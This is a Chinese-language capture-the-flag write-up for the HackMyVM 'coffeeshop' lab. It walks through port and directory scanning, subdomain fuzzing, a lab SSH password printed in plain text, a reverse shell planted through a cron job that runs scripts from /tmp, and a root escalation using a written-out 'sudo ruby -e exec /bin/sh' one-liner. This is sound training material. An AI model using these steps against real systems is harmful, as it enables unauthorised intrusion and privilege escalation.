---
title: "hackmyvm_coffeeshop"
date: "2024-07-27"
description: "全端口扫描也只扫描了一个22和一个80,开始识别一些服务"
---

## [](#信息收集 "信息收集")信息收集

### [](#端口扫描 "端口扫描")端口扫描

```shell
PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)
```

全端口扫描也只扫描了一个22和一个80,开始识别一些服务

```shell
PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 81a4522b143f13682be25bc47bd71aa5 (ECDSA)|_  256 251909292fb8eab4291f6de713d6be7e (ED25519)80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))|_http-title: Under Construction - Midnight Coffee|_http-server-header: Apache/2.4.52 (Ubuntu)MAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### [](#资产梳理 "资产梳理")资产梳理

ssh

OpenSSH 8.9p1

服务器

Apache httpd 2.4.52 ((Ubuntu))

OS

(Ubuntu))

语言

php

## [](#http "http")http

一般来讲这种靶机只能慢慢磨web

#### [](#目录扫描 "目录扫描")目录扫描

```shell
==> DIRECTORY: http://192.168.2.10/shop/                                                                  ---- Entering directory: http://192.168.2.10/shop/ ----+ http://192.168.2.10/shop/index.html (CODE:200|SIZE:2577)                                                                                   ==> DIRECTORY: http://192.168.2.10/shop/stylesheet/                                                                                    
```

只看到一个shop的页面 没什么功能点也没接口,只能继续扫目录  
一个login.php  
[shopadmin@midnight.coffee](mailto:shopadmin@midnight.coffee)邮箱

依旧还是老规矩登录框,测试弱口令等  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240725172416.png)  
woc真的一点思路都没了

### [](#子域名收集 "子域名收集")子域名收集

由于此时我们无法找到任何有用的信息，所以这个时候看一下子域名,所以此时要配置一下hosts  
将域名解析成ip了，同时爆破子域名  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726105213.png)  
使用了fuzz 成功找到一个dev子域名,由于这是在靶场环境，只能解析为同一个ip但是不同服务.  
因此还需要在hosts上加上一个解析。访问dev.midnight.coffee 域名可以得到![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726105606.png)  
之后想到之前的login.php，直接登陆得到ssh的账号和密码  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726105742.png)

## [](#Getshell "Getshell")Getshell

\*\*tuna : 1L0v3\_TuN4\_Very\_Much  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726110307.png)

## [](#Post "Post")Post

#### [](#横向提权 "横向提权")横向提权

查看/etc/crontab 我们可以看到有一个shopadmin的定时任务，查看执行脚本之后才发现他执行/tmp目录下的所有shell脚本。思路就是反弹一个shopadmin的shell到我们的本地。因此写一个1.sh

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240726172113.png)

#### [](#纵向提权 "纵向提权")纵向提权

直接查看sudo 权限  
\*\*\*/usr/bin/ruby \* /opt/shop.rb：

指定允许用户以提升的权限运行的命令或命令集。在这种情况下，它允许用户使用任何参数运行 `ruby` 解释器，后跟位于 `/opt/shop.rb` 的脚本。  
这个就是纯属送分了

但是这个不符合规定的规则，因此可以看到可以将/opt/shop.rb 放在后面

```ruby
sudo ruby -e 'exec "/bin/sh"' /opt/shop.rb
```

拿到root\_shell 打完收工下机
